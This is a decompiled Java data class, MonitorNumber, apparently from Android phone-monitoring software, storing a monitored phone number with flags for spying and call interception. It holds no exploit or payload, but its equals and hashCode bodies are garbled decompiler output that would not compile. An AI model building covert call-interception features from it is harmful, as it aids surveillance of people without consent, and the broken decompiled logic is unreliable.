package com.vvt.callmanager.ref;

import java.io.Serializable;

public class MonitorNumber
  implements Serializable
{
  private static final long serialVersionUID = 6256823258651682376L;
  private boolean callInterceptEnabled;
  private boolean isEnabled;
  private String ownerPackage;
  private String phoneNumber;
  private boolean spyEnabled;
  
  public boolean equals(Object paramObject)
  {
    boolean bool;
    String str1;
    if (paramObject != null)
    {
      bool = paramObject instanceof MonitorNumber;
      if (bool)
      {
        str1 = this.phoneNumber;
        paramObject = (MonitorNumber)paramObject;
        String str2 = ((MonitorNumber)paramObject).getPhoneNumber();
        bool = str1.equals(str2);
      }
    }
    for (;;)
    {
      return bool;
      bool = false;
      str1 = null;
    }
  }
  
  public String getOwnerPackage()
  {
    return this.ownerPackage;
  }
  
  public String getPhoneNumber()
  {
    return this.phoneNumber;
  }
  
  public int hashCode()
  {
    String str = this.phoneNumber;
    int i;
    if (str == null)
    {
      i = 0;
      str = null;
    }
    for (;;)
    {
      return i;
      str = this.phoneNumber;
      i = str.hashCode();
    }
  }
  
  public boolean isCallInterceptEnabled()
  {
    return this.callInterceptEnabled;
  }
  
  public boolean isEnabled()
  {
    return this.isEnabled;
  }
  
  public boolean isSpyEnabled()
  {
    return this.spyEnabled;
  }
  
  public void setCallInterceptEnabled(boolean paramBoolean)
  {
    this.callInterceptEnabled = paramBoolean;
  }
  
  public void setEnabled(boolean paramBoolean)
  {
    this.isEnabled = paramBoolean;
  }
  
  public void setOwnerPackage(String paramString)
  {
    this.ownerPackage = paramString;
  }
  
  public void setPhoneNumber(String paramString)
  {
    this.phoneNumber = paramString;
  }
  
  public void setSpyEnabled(boolean paramBoolean)
  {
    this.spyEnabled = paramBoolean;
  }
  
  public String toString()
  {
    Object[] arrayOfObject = new Object[5];
    Object localObject = this.phoneNumber;
    arrayOfObject[0] = localObject;
    localObject = this.ownerPackage;
    arrayOfObject[1] = localObject;
    localObject = Boolean.valueOf(this.isEnabled);
    arrayOfObject[2] = localObject;
    localObject = Boolean.valueOf(this.spyEnabled);
    arrayOfObject[3] = localObject;
    localObject = Boolean.valueOf(this.callInterceptEnabled);
    arrayOfObject[4] = localObject;
    return String.format("\"%s\", owner=%s, enable=%s, spy=%s, intercept=%s", arrayOfObject);
  }
}


/* Location:              /Volumes/D1/codebase/android/POC/assets/product/maind/classes-enjarify.jar!/com/vvt/callmanager/ref/MonitorNumber.class
 * Java compiler version: 5 (49.0)
 * JD-Core Version:       0.7.1
 */